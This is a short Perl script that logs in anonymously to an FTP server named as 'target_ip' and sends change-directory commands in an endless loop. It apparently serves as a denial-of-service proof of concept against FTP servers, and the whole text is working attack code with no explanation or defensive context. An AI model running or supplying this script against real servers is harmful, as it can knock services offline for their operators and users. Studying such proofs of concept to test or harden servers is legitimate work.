#!/usr/bin/perl -w

use Net::FTP;
$ftp=Net::FTP->new("$ARGV[0]",Debug=>0) || die "Cannot connect to Host $ARGV[0]\n Usage: $perl script_name.pl target_ip\n";
$ftp -> login("anonymous","anonymous") || die "Could not Login...Retry";

while(1)
{
#this loop runs infinitely

$ftp -> cwd();
}

$ftp->quit;
